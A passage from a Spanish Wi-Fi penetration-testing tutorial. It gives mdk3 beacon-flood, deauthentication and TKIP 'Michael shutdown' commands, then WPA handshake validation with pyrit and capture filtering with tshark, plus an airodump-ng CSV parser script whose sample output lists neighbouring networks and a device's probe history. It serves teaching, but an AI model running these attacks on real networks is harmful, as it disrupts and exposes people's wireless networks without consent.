De hecho, hasta si querÃ©is causar curiosidad en el ambiente, si corrÃ©is este modo de ataque con **mdk3** sin
especificar parÃ¡metros:

* mdk3 wlan0mon b

EstarÃ­amos generando puntos de acceso con **ESSID's** aleatorios:

<img align="center" src="https://funkyimg.com/i/2W6sd.png">

#### Disassociation Amok Mode Attack

Realmente esto no deja de parecerse a un ataque de de-autenticaciÃ³n dirigido, pero por cultura, **mdk3**
cuenta con unos modos de operaciÃ³n de tipo **Black List/White List**, desde los cuales podemos especificar quÃ©
clientes queremos que no sean deautenticados del AP, aÃ±adiendo a los mismos en un White List y viceversa.

Para construir el ataque, simplemente debemos crear un fichero con las direcciones MAC de los clientes a los
cuales queremos de-autenticar del AP. Posteriormente, corremos **mdk3** especificando el modo de ataque y el
canal en el que se encuentra la red:

<img align="center" src="https://funkyimg.com/i/2W6tU.png">

#### Michael Shutdown Exploitation

Tal y como dice la propia descripciÃ³n de la utilidad:

`"Can shut down APs using TKIP encryption and QoS Extension with 1 sniffed and 2 injected QoS Data Packets"`

Es decir, podemos llegar a apagar un router a travÃ©s de este ataque. 

**ANOTACIÃ“N:** En la prÃ¡ctica, no es muy efectivo.

La sintaxis serÃ­a la siguiente:

* mdk3 wlan0mon m -t bssidAP

#### TÃ©cnicas Pasivas

Todo lo visto hasta el momento, requiere de la intervenciÃ³n por nuestra parte en el lado del atacante. 

TendrÃ­amos un modo de actuar de forma pasiva para obtener el Handshake, y es simplemente armarnos de valor y
tener paciencia. 

PodrÃ­amos quedarnos esperando hasta que algunas de las estaciones asociadas disponga de mala
seÃ±al, se desconecte y reasocie automÃ¡ticamente sin nosotros tener que hacer nada. PodrÃ­amos quedarnos
esperando hasta que de pronto alguien nuevo que ya estaba asociado en el pasado a la red se asocie de nuevo al
AP. Se podrÃ­a hacer de montÃ³n de maneras distintas.

Lo importante de todo esto es, que el Handshake, no tiene por quÃ© generarse en base a la reautenticaciÃ³n del
cliente a la red pero sÃ³lo si nosotros lo hemos expulsado de la red. Me refiero, el Handshake no guarda
relaciÃ³n alguna con el ataque de de-autenticaciÃ³n para forzar al cliente a que se reconecte a la red.

Siempre el Handshake se va a generar en el momento en el que el cliente se vuelva a conectar a la red, sea por
nuestros medios activos o sin hacer nada a voluntad de la calidad de la seÃ±al entre la estaciÃ³n y el AP, o por
el propio cliente que se ha vuelto a reconectar por 'X' razones.

### ValidaciÃ³n del Handshake con Pyrit

Hasta ahora hemos visto tÃ©cnicas para capturar un Handshake. Ahora bien, en ocasiones, puede suceder que la
suite de aircrack-ng nos diga que ha capturado un Handshake cuando realmente no es asÃ­, no serÃ­a la primera
vez que me ha llegado a suceder.

Â¿QuÃ© mejor que validar la captura con otra herramienta?, con **pyrit**. Pyrit es una herramienta bestial para
el cracking, anÃ¡lisis de capturas y monitorizado de redes inalÃ¡mbricas. Uno de los modos de los que dispone,
es de una especie de '**checker**', con el cual podemos analizar la captura para ver si esta cuenta con un
**Handshake** o no.

Por ejemplo, imaginemos que hemos capturado un supuesto Handshake de una red inalÃ¡mbrica, o al menos eso vemos
desde **aircrack-ng**. Si quisiÃ©ramos ahora validarlo desde **Pyrit**, harÃ­amos lo siguiente sobre la captura
'.cap':

```bash
â”Œâ”€[root@parrot]â”€[/home/s4vitar/Desktop/Red]
â””â”€â”€â•¼ #pyrit -r Captura-01.cap analyze
Pyrit 0.5.1 (C) 2008-2011 Lukas Lueg - 2015 John Mora
https://github.com/JPaulMora/Pyrit
This code is distributed under the GNU General Public License v3+

Parsing file 'Captura-01.cap' (1/1)...
Parsed 2 packets (2 802.11-packets), got 1 AP(s)

#1: AccessPoint 1c:b0:44:d4:16:78 ('MOVISTAR_1677'):
No valid EAOPL-handshake + ESSID detected.
```

Como vemos, '**No valid EAOPL-handshake + ESSID detected.**', por lo que la captura no cuenta con ningÃºn
Handshake.

Veamos ahora un caso donde sÃ­ nos reporta que la captura cuenta con un Handshake vÃ¡lido:

```bash
â”Œâ”€[âœ—]â”€[root@parrot]â”€[/home/s4vitar/Desktop/Red]
â””â”€â”€â•¼ #pyrit -r Captura-02.cap analyze
Pyrit 0.5.1 (C) 2008-2011 Lukas Lueg - 2015 John Mora
https://github.com/JPaulMora/Pyrit
This code is distributed under the GNU General Public License v3+

Parsing file 'Captura-02.cap' (1/1)...
Parsed 63 packets (63 802.11-packets), got 1 AP(s)

#1: AccessPoint 20:34:fb:b1:c5:53 ('hacklab'):
  #1: Station 34:41:5d:46:d1:38, 1 handshake(s):
    #1: HMAC_SHA1_AES, good*, spread 1
```

Tal y como se puede observar, la red **hacklab** cuenta con un Handshake generado por parte de la estaciÃ³n
**34:41:5d:46:d1:38**, lo cual incluso nos viene de maravilla, porque asÃ­ tenemos una traza de todo lo
referente a dicha captura, incluido el nombre de la red inalÃ¡mbrica en caso de que el nombre de nuestra
captura no identifique al AP.

### Tratamiento y filtro de la captura

Cabe decir que a la hora de capturar un Handshake, capturamos tal vez mÃ¡s de lo que necesitamos durante el
tiempo de espera. La captura final, puede ser tratada para extraer simplemente la informaciÃ³n mÃ¡s relevante
del AP, que serÃ­a el **eapol**.

Con la herramienta **tshark**, podemos generar una nueva captura filtrando Ãºnicamente los paquetes que nos
interesa de la captura previamente realizada:

```bash
â”Œâ”€[root@parrot]â”€[/home/s4vitar/Desktop/Red]
â””â”€â”€â•¼ #tshark -r Captura-02.cap -Y "eapol" 2>/dev/null
   34   7.903744 XiaomiCo_b1:c5:53 â†’ IntelCor_46:d1:38 EAPOL 133 Key (Message 1 of 4)
   36   7.907316 IntelCor_46:d1:38 â†’ XiaomiCo_b1:c5:53 EAPOL 155 Key (Message 2 of 4)
   40   7.912448 XiaomiCo_b1:c5:53 â†’ IntelCor_46:d1:38 EAPOL 189 Key (Message 3 of 4)
   42   7.914483 IntelCor_46:d1:38 â†’ XiaomiCo_b1:c5:53 EAPOL 133 Key (Message 4 of 4)
â”Œâ”€[root@parrot]â”€[/home/s4vitar/Desktop/Red]
â””â”€â”€â•¼ #tshark -r Captura-02.cap -Y "eapol" 2>/dev/null -w filteredCapture
â”Œâ”€[root@parrot]â”€[/home/s4vitar/Desktop/Red]
â””â”€â”€â•¼ #pyrit -r filteredCapture analyze
Pyrit 0.5.1 (C) 2008-2011 Lukas Lueg - 2015 John Mora
https://github.com/JPaulMora/Pyrit
This code is distributed under the GNU General Public License v3+

Parsing file 'filteredCapture' (1/1)...
Parsed 4 packets (4 802.11-packets), got 1 AP(s)

#1: AccessPoint 20:34:fb:b1:c5:53 ('None'):
  #1: Station 34:41:5d:46:d1:38, 1 handshake(s):
    #1: HMAC_SHA1_AES, good, spread 1
No valid EAOPL-handshake + ESSID detected.
```

Y como vemos, nos sigue notificando de que hay 1 Handshake vÃ¡lido por parte de la estaciÃ³n especificada. Sin
embargo, vemos que ahora en el campo 'ESSID' de la red nos pone **None**. Esto es asÃ­ dado que el campo
**eapol** no guarda ese tipo de informaciÃ³n. 

Ahora es cuando recapitulamos, Â¿quÃ© tipo de paquete es el que
guarda esa informaciÃ³n?... exacto, los paquetes **Beacon**, por tanto podemos ajustar un poco mÃ¡s nuestro
filtro para seguir desechando paquetes no necesarios pero filtrando algo mÃ¡s de informaciÃ³n en lo referente a
nuestro AP vÃ­ctima, haciendo uso para ello del operador **OR**:

```bash
â”Œâ”€[root@parrot]â”€[/home/s4vitar/Desktop/Red]
â””â”€â”€â•¼ #tshark -r Captura-02.cap -Y "wlan.fc.type_subtype==0x08 || eapol" 2>/dev/null
    1   0.000000 XiaomiCo_b1:c5:53 â†’ Broadcast    802.11 239 Beacon frame, SN=1893, FN=0, Flags=........, BI=100, SSID=hacklab
   34   7.903744 XiaomiCo_b1:c5:53 â†’ IntelCor_46:d1:38 EAPOL 133 Key (Message 1 of 4)
   36   7.907316 IntelCor_46:d1:38 â†’ XiaomiCo_b1:c5:53 EAPOL 155 Key (Message 2 of 4)
   40   7.912448 XiaomiCo_b1:c5:53 â†’ IntelCor_46:d1:38 EAPOL 189 Key (Message 3 of 4)
   42   7.914483 IntelCor_46:d1:38 â†’ XiaomiCo_b1:c5:53 EAPOL 133 Key (Message 4 of 4)
```

En este caso, vemos que ha habido un paquete Beacon capturado, indicando el nombre del ESSID al final de la
primera lÃ­nea.

Si exportamos dicha captura y analizamos ahora desde **Pyrit**:

```bash
â”Œâ”€[root@parrot]â”€[/home/s4vitar/Desktop/Red]
â””â”€â”€â•¼ #tshark -r Captura-02.cap -Y "wlan.fc.type_subtype==0x08 || eapol" 2>/dev/null -w filteredCapture
â”Œâ”€[root@parrot]â”€[/home/s4vitar/Desktop/Red]
â””â”€â”€â•¼ #pyrit -r filteredCapture analyze
Pyrit 0.5.1 (C) 2008-2011 Lukas Lueg - 2015 John Mora
https://github.com/JPaulMora/Pyrit
This code is distributed under the GNU General Public License v3+

Parsing file 'filteredCapture' (1/1)...
Parsed 5 packets (5 802.11-packets), got 1 AP(s)

#1: AccessPoint 20:34:fb:b1:c5:53 ('hacklab'):
  #1: Station 34:41:5d:46:d1:38, 1 handshake(s):
    #1: HMAC_SHA1_AES, good, spread 1
```

El campo **'None'** es sustituido por el **ESSID** de la red. 

**ANOTACIÃ“N**: En mi opiniÃ³n, recomiendo hacer uso del siguiente filtrado para este tipo de casos, donde
ademÃ¡s de los paquetes **Beacon** es preferible filtrar tambiÃ©n por los paquetes **Probe Response**.

```bash
â”Œâ”€[root@parrot]â”€[/home/s4vitar/Desktop/Red]
â””â”€â”€â•¼ #tshark -r Captura-02.cap -Y "wlan.fc.type_subtype==0x08 || wlan.fc.type_subtype==0x05 || eapol" 2>/dev/null
    1   0.000000 XiaomiCo_b1:c5:53 â†’ Broadcast    802.11 239 Beacon frame, SN=1893, FN=0, Flags=........, BI=100, SSID=hacklab
    3   0.374849 XiaomiCo_b1:c5:53 â†’ HonHaiPr_17:91:c0 802.11 210 Probe Response, SN=2287, FN=0, Flags=........, BI=100, SSID=hacklab
    5   0.586817 XiaomiCo_b1:c5:53 â†’ HonHaiPr_17:91:c0 802.11 210 Probe Response, SN=2288, FN=0, Flags=........, BI=100, SSID=hacklab
    6   0.590400 XiaomiCo_b1:c5:53 â†’ HonHaiPr_17:91:c0 802.11 210 Probe Response, SN=2288, FN=0, Flags=........, BI=100, SSID=hacklab
    7   0.594497 XiaomiCo_b1:c5:53 â†’ HonHaiPr_17:91:c0 802.11 210 Probe Response, SN=2288, FN=0, Flags=........, BI=100, SSID=hacklab
    8   0.596543 XiaomiCo_b1:c5:53 â†’ HonHaiPr_17:91:c0 802.11 210 Probe Response, SN=2288, FN=0, Flags=....R..., BI=100, SSID=hacklab
    9   0.600640 XiaomiCo_b1:c5:53 â†’ HonHaiPr_17:91:c0 802.11 210 Probe Response, SN=2288, FN=0, Flags=........, BI=100, SSID=hacklab
   10   0.602688 XiaomiCo_b1:c5:53 â†’ HonHaiPr_17:91:c0 802.11 210 Probe Response, SN=2288, FN=0, Flags=....R..., BI=100, SSID=hacklab
   11   0.605759 XiaomiCo_b1:c5:53 â†’ HonHaiPr_17:91:c0 802.11 210 Probe Response, SN=2288, FN=0, Flags=....R..., BI=100, SSID=hacklab
   12   0.610367 XiaomiCo_b1:c5:53 â†’ HonHaiPr_17:91:c0 802.11 210 Probe Response, SN=2288, FN=0, Flags=........, BI=100, SSID=hacklab
   13   4.188928 XiaomiCo_b1:c5:53 â†’ IntelCor_46:d1:38 802.11 229 Probe Response, SN=1935, FN=0, Flags=........, BI=100, SSID=hacklab
   34   7.903744 XiaomiCo_b1:c5:53 â†’ IntelCor_46:d1:38 EAPOL 133 Key (Message 1 of 4)
   36   7.907316 IntelCor_46:d1:38 â†’ XiaomiCo_b1:c5:53 EAPOL 155 Key (Message 2 of 4)
   40   7.912448 XiaomiCo_b1:c5:53 â†’ IntelCor_46:d1:38 EAPOL 189 Key (Message 3 of 4)
   42   7.914483 IntelCor_46:d1:38 â†’ XiaomiCo_b1:c5:53 EAPOL 133 Key (Message 4 of 4)
  112   8.252481 XiaomiCo_b1:c5:53 â†’ HonHaiPr_17:91:c0 802.11 210 Probe Response, SN=2292, FN=0, Flags=........, BI=100, SSID=hacklab
  113   8.259649 XiaomiCo_b1:c5:53 â†’ HonHaiPr_17:91:c0 802.11 210 Probe Response, SN=2292, FN=0, Flags=........, BI=100, SSID=hacklab
  114   8.261696 XiaomiCo_b1:c5:53 â†’ HonHaiPr_17:91:c0 802.11 210 Probe Response, SN=2292, FN=0, Flags=....R..., BI=100, SSID=hacklab
  115   8.272449 XiaomiCo_b1:c5:53 â†’ HonHaiPr_17:91:c0 802.11 210 Probe Response, SN=2292, FN=0, Flags=........, BI=100, SSID=hacklab
```

Otra buena prÃ¡ctica y consejo es acostumbrarnos a hacer estas filtraciones indicando el BSSID de la red
objetivo, asÃ­ evitamos confusiones y estar filtrando paquetes que no corresponden.

Para este caso, como sabemos que la direcciÃ³n MAC del AP es **20:34:fb:b1:c5:53** (lo podemos ver desde
Pyrit), una buena prÃ¡ctica serÃ­a hacer lo siguiente:

```bash
â”Œâ”€[root@parrot]â”€[/home/s4vitar/Desktop/Red]
â””â”€â”€â•¼ #tshark -r Captura-02.cap -Y "(wlan.fc.type_subtype==0x08 || wlan.fc.type_subtype==0x05 || eapol) && wlan.addr==20:34:fb:b1:c5:53" 2>/dev/null
    1   0.000000 XiaomiCo_b1:c5:53 â†’ Broadcast    802.11 239 Beacon frame, SN=1893, FN=0, Flags=........, BI=100, SSID=hacklab
    3   0.374849 XiaomiCo_b1:c5:53 â†’ HonHaiPr_17:91:c0 802.11 210 Probe Response, SN=2287, FN=0, Flags=........, BI=100, SSID=hacklab
    5   0.586817 XiaomiCo_b1:c5:53 â†’ HonHaiPr_17:91:c0 802.11 210 Probe Response, SN=2288, FN=0, Flags=........, BI=100, SSID=hacklab
    6   0.590400 XiaomiCo_b1:c5:53 â†’ HonHaiPr_17:91:c0 802.11 210 Probe Response, SN=2288, FN=0, Flags=........, BI=100, SSID=hacklab
    7   0.594497 XiaomiCo_b1:c5:53 â†’ HonHaiPr_17:91:c0 802.11 210 Probe Response, SN=2288, FN=0, Flags=........, BI=100, SSID=hacklab
    8   0.596543 XiaomiCo_b1:c5:53 â†’ HonHaiPr_17:91:c0 802.11 210 Probe Response, SN=2288, FN=0, Flags=....R..., BI=100, SSID=hacklab
    9   0.600640 XiaomiCo_b1:c5:53 â†’ HonHaiPr_17:91:c0 802.11 210 Probe Response, SN=2288, FN=0, Flags=........, BI=100, SSID=hacklab
   10   0.602688 XiaomiCo_b1:c5:53 â†’ HonHaiPr_17:91:c0 802.11 210 Probe Response, SN=2288, FN=0, Flags=....R..., BI=100, SSID=hacklab
   11   0.605759 XiaomiCo_b1:c5:53 â†’ HonHaiPr_17:91:c0 802.11 210 Probe Response, SN=2288, FN=0, Flags=....R..., BI=100, SSID=hacklab
   12   0.610367 XiaomiCo_b1:c5:53 â†’ HonHaiPr_17:91:c0 802.11 210 Probe Response, SN=2288, FN=0, Flags=........, BI=100, SSID=hacklab
   13   4.188928 XiaomiCo_b1:c5:53 â†’ IntelCor_46:d1:38 802.11 229 Probe Response, SN=1935, FN=0, Flags=........, BI=100, SSID=hacklab
   34   7.903744 XiaomiCo_b1:c5:53 â†’ IntelCor_46:d1:38 EAPOL 133 Key (Message 1 of 4)
   36   7.907316 IntelCor_46:d1:38 â†’ XiaomiCo_b1:c5:53 EAPOL 155 Key (Message 2 of 4)
   40   7.912448 XiaomiCo_b1:c5:53 â†’ IntelCor_46:d1:38 EAPOL 189 Key (Message 3 of 4)
   42   7.914483 IntelCor_46:d1:38 â†’ XiaomiCo_b1:c5:53 EAPOL 133 Key (Message 4 of 4)
  112   8.252481 XiaomiCo_b1:c5:53 â†’ HonHaiPr_17:91:c0 802.11 210 Probe Response, SN=2292, FN=0, Flags=........, BI=100, SSID=hacklab
  113   8.259649 XiaomiCo_b1:c5:53 â†’ HonHaiPr_17:91:c0 802.11 210 Probe Response, SN=2292, FN=0, Flags=........, BI=100, SSID=hacklab
  114   8.261696 XiaomiCo_b1:c5:53 â†’ HonHaiPr_17:91:c0 802.11 210 Probe Response, SN=2292, FN=0, Flags=....R..., BI=100, SSID=hacklab
  115   8.272449 XiaomiCo_b1:c5:53 â†’ HonHaiPr_17:91:c0 802.11 210 Probe Response, SN=2292, FN=0, Flags=........, BI=100, SSID=hacklab
```

Por Ãºltimo y para que no os asustÃ©is, fijaros quÃ© curioso:

```bash
â”Œâ”€[root@parrot]â”€[/home/s4vitar/Desktop/Red]
â””â”€â”€â•¼ #tshark -r Captura-02.cap -Y "(wlan.fc.type_subtype==0x08 || wlan.fc.type_subtype==0x05 || eapol) && wlan.addr==20:34:fb:b1:c5:53" -w filteredCapture 2>/dev/null
â”Œâ”€[root@parrot]â”€[/home/s4vitar/Desktop/Red]
â””â”€â”€â•¼ #aircrack-ng filteredCapture 
Opening filteredCapture wait...
Unsupported file format (not a pcap or IVs file).
Read 0 packets.

No networks found, exiting.


Quitting aircrack-ng...
```

La suite de **aircrack-ng**, deberÃ­a ser capaz de distinguirnos el punto de acceso y el Handshake capturado,
hemos visto que **Pyrit** lo detecta sin problemas, Â¿por quÃ© aircrack no?, la respuesta es sencilla. A la hora
de exportar la captura desde **tshark**, si queremos que **aircrack** nos lo interprete, debemos de
especificar en el modo de exportaciÃ³n para la captura el formato **pcap**, de la siguiente forma:

```bash
â”Œâ”€[root@parrot]â”€[/home/s4vitar/Desktop/Red]
â””â”€â”€â•¼ #tshark -r Captura-02.cap -R "(wlan.fc.type_subtype==0x08 || wlan.fc.type_subtype==0x05 || eapol) && wlan.addr==20:34:fb:b1:c5:53" -2 -w filteredCapture -F pcap 2>/dev/null
â”Œâ”€[root@parrot]â”€[/home/s4vitar/Desktop/Red]
â””â”€â”€â•¼ #aircrack-ng filteredCapture 
Opening filteredCapture wait...
Read 19 packets.

   #  BSSID              ESSID                     Encryption

   1  20:34:FB:B1:C5:53  hacklab                   WPA (1 handshake)

Choosing first network as target.

Opening filteredCapture wait...
Read 19 packets.

1 potential targets
```

Destacar que he hecho uso del parÃ¡metro '**-R**' en vez del '**-Y**' porque estoy haciendo uso del parÃ¡metro
'**-2**', con el objetivo de hacer un doble pase durante la fase de anÃ¡lisis. Esta opciÃ³n es incluso mejor,
dado que se recopilan las anotaciones. El uso del parÃ¡metro '**-R**' requiere de forma obligatoria que
aÃ±adamos el parÃ¡metro '**-2**'.

Os dejo por aquÃ­ una pequeÃ±a aclaratoria de la utilidad de estos parÃ¡metros: <a href="https://osqa-ask.wireshark.org/questions/19794/what-is-the-meaning-of-two-pass-analysis">InterÃ©s</a>

### Parseador para redes del entorno

Hasta ahora hemos estado parseando redes especÃ­ficas, pero, Â¿no te has parado a pensar en que tambiÃ©n
podrÃ­amos hacer esto?:

* airodump-ng wlan0mon -w Captura

Es decir, capturar todo el trÃ¡fico de todas las redes disponibles en el entorno en un fichero. Â¿Por quÃ© Ã­bamos
a querer hacer esto?, bueno, desde **airodump-ng**, en el momento de escanear las redes del entorno, lo vemos
todo claro, bien representado, sin embargo, una vez las evidencias son exportadas al fichero especificado, ya
la manera de representar los datos no son los mismos.

Por ello, os comparto el siguiente script en Bash:

```bash
#!/bin/bash

if [[ "$1" && -f "$1" ]]; then
    FILE="$1"
else
    echo -e '\nEspecifica el fichero .csv a analizar\n';
    echo 'Uso:';
    echo -e "\t./parser.sh Captura-01.csv\n";
    exit  
fi

test -f oui.txt 2>/dev/null

if [ "$(echo $?)" == "0" ]; then
  
    echo -e "\n\033[1mNÃºmero total de puntos de acceso: \033[0;31m`grep -E '([A-Za-z0-9._: @\(\)\\=\[\{\}\"%;-]+,){14}' $FILE | wc -l`\e[0m"
    echo -e "\033[1mNÃºmero total de estaciones: \033[0;31m`grep -E '([A-Za-z0-9._: @\(\)\\=\[\{\}\"%;-]+,){5} ([A-Z0-9:]{17})|(not associated)' $FILE | wc -l`\e[0m"
    echo -e "\033[1mNÃºmero total de estaciones no asociadas: \033[0;31m`grep -E '(not associated)' $FILE | wc -l`\e[0m"
    
    echo -e "\n\033[0;36m\033[1mPuntos de acceso disponibles:\e[0m\n"
    
    while read -r line ; do
    
        if [ "`echo "$line" | cut -d ',' -f 14`" != " " ]; then
            echo -e "\033[1m" `echo -e "$line" | cut -d ',' -f 14` "\e[0m"
        else
            echo -e " \e[3mNo es posible obtener el nombre de la red (ESSID)\e[0m"
        fi
    
        fullMAC=`echo "$line" | cut -d ',' -f 1`
        echo -e "\tDirecciÃ³n MAC: $fullMAC"
    
        MAC=`echo "$fullMAC" | sed 's/ //g' | sed 's/-//g' | sed 's/://g' | cut -c1-6`
    
        result="$(grep -i -A 1 ^$MAC ./oui.txt)";
    
        if [ "$result" ]; then
            echo -e "\tVendor: `echo "$result" | cut -f 3`"
        else
            echo -e "\tVendor: \e[3mInformaciÃ³n no encontrada en la base de datos\e[0m"
        fi
    
        is5ghz=`echo "$line" | cut -d ',' -f 4 | grep -i -E '36|40|44|48|52|56|60|64|100|104|108|112|116|120|124|128|132|136|140'`
    
        if [ "$is5ghz" ]; then
            echo -e "\t\033[0;31mOpera en 5 GHz!\e[0m"
        fi
    
        printonce="\tEstaciones:"
    
        while read -r line2 ; do
    
            clientsMAC=`echo $line2 | grep -E "$fullMAC"`
            if [ "$clientsMAC" ]; then
    
                if [ "$printonce" ]; then
                    echo -e $printonce
                    printonce=''
                fi
    
                echo -e "\t\t\033[0;32m" `echo $clientsMAC | cut -d ',' -f 1` "\e[0m"
                MAC2=`echo "$clientsMAC" | sed 's/ //g' | sed 's/-//g' | sed 's/://g' | cut -c1-6`
    
                result2="$(grep -i -A 1 ^$MAC2 ./oui.txt)";
    
                if [ "$result2" ]; then
                    echo -e "\t\t\tVendor: `echo "$result2" | cut -f 3`"
                    ismobile=`echo $result2 | grep -i -E 'Olivetti|Sony|Mobile|Apple|Samsung|HUAWEI|Motorola|TCT|LG|Ragentek|Lenovo|Shenzhen|Intel|Xiaomi|zte'`
                    warning=`echo $result2 | grep -i -E 'ALFA|Intel'`
                    if [ "$ismobile" ]; then
                        echo -e "\t\t\t\033[0;33mEs probable que se trate de un dispositivo mÃ³vil\e[0m"
                    fi
    
                    if [ "$warning" ]; then
                        echo -e "\t\t\t\033[0;31;5;7mEl dispositivo soporta el modo monitor\e[0m"
                    fi
    
                else
                    echo -e "\t\t\tVendor: \e[3mInformaciÃ³n no encontrada en la base de datos\e[0m"
                fi
    
                probed=`echo $line2 | cut -d ',' -f 7`
    
                if [ "`echo $probed | grep -E [A-Za-z0-9_\\-]+`" ]; then
                    echo -e "\t\t\tRedes a las que el dispositivo ha estado asociado: $probed"
                fi        
            fi
        done < <(grep -E '([A-Za-z0-9._: @\(\)\\=\[\{\}\"%;-]+,){5} ([A-Z0-9:]{17})|(not associated)' $FILE)
        
    done < <(grep -E '([A-Za-z0-9._: @\(\)\\=\[\{\}\"%;-]+,){14}' $FILE)
    
    echo -e "\n\033[0;36m\033[1mEstaciones no asociadas:\e[0m\n"
    
    while read -r line2 ; do
    
        clientsMAC=`echo $line2  | cut -d ',' -f 1`
    
        echo -e "\033[0;31m" `echo $clientsMAC | cut -d ',' -f 1` "\e[0m"
        MAC2=`echo "$clientsMAC" | sed 's/ //g' | sed 's/-//g' | sed 's/://g' | cut -c1-6`
    
        result2="$(grep -i -A 1 ^$MAC2 ./oui.txt)";
    
        if [ "$result2" ]; then
            echo -e "\tVendor: `echo "$result2" | cut -f 3`"
            ismobile=`echo $result2 | grep -i -E 'Olivetti|Sony|Mobile|Apple|Samsung|HUAWEI|Motorola|TCT|LG|Ragentek|Lenovo|Shenzhen|Intel|Xiaomi|zte'`
            warning=`echo $result2 | grep -i -E 'ALFA|Intel'`
            if [ "$ismobile" ]; then
                echo -e "\t\033[0;33mEs probable que se trate de un dispositivo mÃ³vil\e[0m"
            fi
            if [ "$warning" ]; then
                echo -e "\t\033[0;31;5;7mEl dispositivo soporta el modo monitor\e[0m"
            fi
        else
            echo -e "\tVendor: \e[3mInformaciÃ³n no encontrada en la base de datos\e[0m"
        fi
    
        probed=`echo $line2 | cut -d ',' -f 7`
    
        if [ "`echo $probed | grep -E [A-Za-z0-9_\\-]+`" ]; then
            echo -e "\tRedes a las que el dispositivo ha estado asociado: $probed"
        fi        
    
    done < <(grep -E '(not associated)' $FILE)
else
    echo -e "\n[!] Archivo oui.txt no encontrado, descÃ¡rgalo desde aquÃ­: http://standards-oui.ieee.org/oui/oui.txt\n"
fi
```

Aprovechando el fichero '.csv' generado automÃ¡ticamente tras correr **airodump** sobre la red objetivo,
podemos hacer uso de este parseador para representar toda la informaciÃ³n de los datos capturados.

Correr el script es bastante sencillo:

```bash
â”Œâ”€[âœ—]â”€[root@parrot]â”€[/home/s4vitar/Desktop]
â””â”€â”€â•¼ #./file.sh 

Especifica el fichero .csv a analizar

Uso:
	./parser.sh Captura-01.csv

â”Œâ”€[root@parrot]â”€[/home/s4vitar/Desktop]
â””â”€â”€â•¼ #./file.sh captura-01.csv 

[!] Archivo oui.txt no encontrado, descÃ¡rgalo desde aquÃ­: http://standards-oui.ieee.org/oui/oui.txt
```

Como vemos, la primera vez que lo corremos, en caso de no contar con el fichero 'oui.txt', se genera un
pequeÃ±o aviso para avisar de que necesitamos descargarlo para correr el script, pues en caso contrario los
datos no serÃ¡n bien representados.

Por tanto:

* wget http://standards-oui.ieee.org/oui/oui.txt

Una vez hecho, ya podemos ejecutar el script, obteniendo los siguientes resultados:

```bash
â”Œâ”€[root@parrot]â”€[/home/s4vitar/Desktop]
â””â”€â”€â•¼ #./file.sh captura-01.csv 

NÃºmero total de puntos de acceso: 43
NÃºmero total de estaciones: 5
NÃºmero total de estaciones no asociadas: 5

Puntos de acceso disponibles:

 Invitados 
	DirecciÃ³n MAC: 4C:96:14:2C:42:82
	Vendor: Juniper Networks
 MiFibra-CECC 
	DirecciÃ³n MAC: 44:FE:3B:FE:CE:CE
	Vendor: Arcadyan Corporation
 WIFI_EXT 
	DirecciÃ³n MAC: 4C:96:14:2C:42:86
	Vendor: Juniper Networks
 MOVISTAR_A908 
	DirecciÃ³n MAC: FC:B4:E6:99:A9:09
	Vendor: ASKEY COMPUTER CORP
 No es posible obtener el nombre de la red (ESSID)
	DirecciÃ³n MAC: 00:9A:CD:E7:C0:24
	Vendor: HUAWEI TECHNOLOGIES CO.,LTD
 MiFibra-91BD 
	DirecciÃ³n MAC: 70:4F:57:9F:9A:8B
	Vendor: TP-LINK TECHNOLOGIES CO.,LTD.
 Interno 
	DirecciÃ³n MAC: 4C:96:14:2C:42:80
	Vendor: Juniper Networks
 MOVISTAR_171B 
	DirecciÃ³n MAC: 78:29:ED:9D:17:1C
	Vendor: ASKEY COMPUTER CORP
 JAZZTEL_1301. 
	DirecciÃ³n MAC: 00:B6:B7:36:06:0C
	Vendor: InformaciÃ³n no encontrada en la base de datos
 WIFI_EXT2 
	DirecciÃ³n MAC: 44:48:C1:F1:97:03
	Vendor: Hewlett Packard Enterprise
 Interno 
	DirecciÃ³n MAC: 4C:96:14:2C:47:40
	Vendor: Juniper Networks
	Estaciones:
		 4C:96:14:2C:47:40 
			Vendor: Juniper Networks
			Redes a las que el dispositivo ha estado asociado: MAPFRE
 iMovil 
	DirecciÃ³n MAC: 4C:96:14:27:B9:84
	Vendor: Juniper Networks
 MOVISTAR_9E71 
	DirecciÃ³n MAC: 94:91:7F:0E:9E:72
	Vendor: ASKEY COMPUTER CORP
 MiFibra-7BB4 
	DirecciÃ³n MAC: 94:6A:B0:60:7B:B6
	Vendor: Arcadyan Corporation
 MOVISTAR_D8C1 
	DirecciÃ³n MAC: 1C:B0:44:50:D8:C2
	Vendor: ASKEY COMPUTER CORP
 MiFibra-226A 
	DirecciÃ³n MAC: 94:6A:B0:9B:22:6C
	Vendor: Arcadyan Corporation
 MOVISTAR_4DE8 
	DirecciÃ³n MAC: 78:29:ED:22:4D:E9
	Vendor: ASKEY COMPUTER CORP
 Interno 
	DirecciÃ³n MAC: 4C:96:14:27:B9:80
	Vendor: Juniper Networks
 WIFI_EXT 
	DirecciÃ³n MAC: 4C:96:14:27:B9:86
	Vendor: Juniper Networks
 Invitados 
	DirecciÃ³n MAC: A8:D0:E5:C1:C9:42
	Vendor: Juniper Networks
 iMovil 
	DirecciÃ³n MAC: A8:D0:E5:C1:C9:44
	Vendor: Juniper Networks
 Invitados 
	DirecciÃ³n MAC: 4C:96:14:27:B9:82
	Vendor: Juniper Networks
 WIFI_EXT 
	DirecciÃ³n MAC: 4C:96:14:2C:47:46
	Vendor: Juniper Networks
 Interno 
	DirecciÃ³n MAC: A8:D0:E5:C1:C9:40
	Vendor: Juniper Networks
 vodafone18AC 
	DirecciÃ³n MAC: 24:DF:6A:10:18:B4
	Vendor: HUAWEI TECHNOLOGIES CO.,LTD
 MOVISTAR_3126 
	DirecciÃ³n MAC: CC:D4:A1:0C:31:28
	Vendor: MitraStar Technology Corp.
 WIFI_EXT 
	DirecciÃ³n MAC: A8:D0:E5:C1:C9:46
	Vendor: Juniper Networks
 Orange-A238 
	DirecciÃ³n MAC: 50:7E:5D:2F:A2:3A
	Vendor: Arcadyan Technology Corporation
 MOVISTAR_1083 
	DirecciÃ³n MAC: F8:8E:85:43:10:84
	Vendor: Comtrend Corporation
 MIWIFI_2G_2Xhs 
	DirecciÃ³n MAC: E4:CA:12:96:21:FE
	Vendor: zte corporation
 Interno2 
	DirecciÃ³n MAC: 44:48:C1:F1:96:A0
	Vendor: Hewlett Packard Enterprise
 WLAN_4A4C 
	DirecciÃ³n MAC: 00:1A:2B:AC:0B:CF
	Vendor: Ayecom Technology Co., Ltd.
 iMovil2 
	DirecciÃ³n MAC: 44:48:C1:F1:96:A4
	Vendor: Hewlett Packard Enterprise
 MOVISTAR_2F95 
